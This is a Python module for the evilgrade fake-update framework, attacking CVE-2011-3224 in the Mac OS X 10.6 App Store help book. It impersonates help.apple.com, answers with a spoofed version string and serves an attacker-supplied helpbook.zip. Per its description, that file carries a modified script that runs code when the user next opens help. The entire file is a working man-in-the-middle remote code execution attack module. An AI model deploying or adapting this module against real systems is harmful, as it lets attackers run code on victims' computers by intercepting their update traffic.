from modules import ModuleBase


class AppStore(ModuleBase):
    name = 'appstore'
    version = '1.0'
    appver = '< Mac OS X v10.6.*'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com >']
    description = """CVE: CVE-2011-3224 Found By: Aaron Sigel and Brian Mastenbrook
            The agent have a modification in Resources/scripts/updatefrontend.py to open a Chess application
            look for the comment evilgrade.
            The code is execute the next time the user open the help book, more information:
            http://vttynotes.blogspot.com/2011/10/cve-2011-3224-mitm-to-rce-with-mac-app.html"""
    agent_filename = './agent/helpbook.zip'
    vh = '(help.apple.com)'
    requests = [{
            'path': 'helpbook-version.txt',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': '324071169.795686',
            'parse': 0,
            'file': '',
        }, {
            'path': '.zip',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }]
